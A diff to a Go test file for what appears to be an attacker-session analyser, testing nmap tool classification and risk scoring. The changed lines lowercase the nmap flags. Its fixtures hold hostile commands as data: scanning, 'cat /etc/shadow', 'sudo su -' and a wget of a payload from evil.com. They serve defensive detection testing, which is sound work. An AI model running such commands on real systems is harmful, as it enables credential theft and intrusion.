@@ -51,8 +51,8 @@ func TestIsHuman_VariableTiming(t *testing.T) {
 
 func TestClassifyTool_Nmap(t *testing.T) {
 	events := []models.Event{
-		{ID: "1", Type: "command", Payload: map[string]any{"data": "nmap -sV -p- 192.168.1.0/24"}},
-		{ID: "2", Type: "command", Payload: map[string]any{"data": "nmap -O target"}},
+		{ID: "1", Type: "command", Payload: map[string]any{"data": "nmap -sv -p- 192.168.1.0/24"}},
+		{ID: "2", Type: "command", Payload: map[string]any{"data": "nmap -o  target"}},
 	}
 	tool := ClassifyTool(events)
 	if tool != "nmap" {
@@ -92,7 +92,7 @@ func TestRiskScore_High(t *testing.T) {
 	}
 	events := []models.Event{
 		{ID: "1", SessionID: "s-1", Type: "login", OccurredAt: base, Payload: map[string]any{"data": "root"}},
-		{ID: "2", SessionID: "s-1", Type: "command", OccurredAt: base.Add(1 * time.Second), Payload: map[string]any{"data": "nmap -sV 10.0.0.0/8"}},
+		{ID: "2", SessionID: "s-1", Type: "command", OccurredAt: base.Add(1 * time.Second), Payload: map[string]any{"data": "nmap -sv 10.0.0.0/8"}},
 		{ID: "3", SessionID: "s-1", Type: "command", OccurredAt: base.Add(2 * time.Second), Payload: map[string]any{"data": "cat /etc/shadow"}},
 		{ID: "4", SessionID: "s-1", Type: "command", OccurredAt: base.Add(3 * time.Second), Payload: map[string]any{"data": "sudo su -"}},
 		{ID: "5", SessionID: "s-1", Type: "command", OccurredAt: base.Add(4 * time.Second), Payload: map[string]any{"data": "wget http://evil.com/payload.sh"}},
